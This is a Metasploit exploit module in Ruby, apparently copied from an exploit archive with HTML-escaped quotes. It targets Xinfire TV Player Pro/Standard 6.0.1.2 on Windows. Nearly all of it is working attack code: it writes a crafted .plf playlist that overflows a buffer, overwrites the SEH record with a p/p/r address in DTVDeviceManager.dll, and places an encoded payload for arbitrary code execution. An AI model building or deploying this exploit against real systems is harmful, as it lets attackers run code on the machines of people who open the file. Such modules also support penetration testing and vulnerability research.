# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Xinfire TV Player Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a buffer overflow in Xinfire TV Player Pro and Standard v6.0.1.2.When
        the application is used to import a specially crafted plf file, a buffer overflow occurs
        allowing arbitrary code execution.Tested successfully on Win7, Win10.This software is similar as 
        Aviosoft Digital TV Player and BlazeVideo HDTV Player.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;metacom&#039; # MSF Module and Vulnerability discovery 
        ],
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;&#039; ],
          [ &#039;EDB&#039;, &#039;&#039; ],
          [ &#039;EDB&#039;, &#039;&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;,
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 1384,
          &#039;BadChars&#039; => "\x00\x0a\x0d\x1a\x2f\x3a\x5c",
          &#039;DisableNops&#039; => true,
        },
      &#039;Platform&#039; => &#039;win&#039;,
      &#039;Targets&#039;  =>
        [  
          [ &#039;Windows Universal&#039;, { &#039;Ret&#039; => 0x613018E9, &#039;Offset&#039; => 608 } ],  # p/p/r DTVDeviceManager.dll
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Apr 16 2020&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.plf&#039;]),
      ])

  end

  def exploit

    buffer = rand_text(target[&#039;Offset&#039;])  #junk
    buffer << generate_seh_record(target.ret)
    buffer << payload.encoded  #1384 bytes of space
    # more junk may be needed to trigger the exception

    file_create(buffer)

  end
end

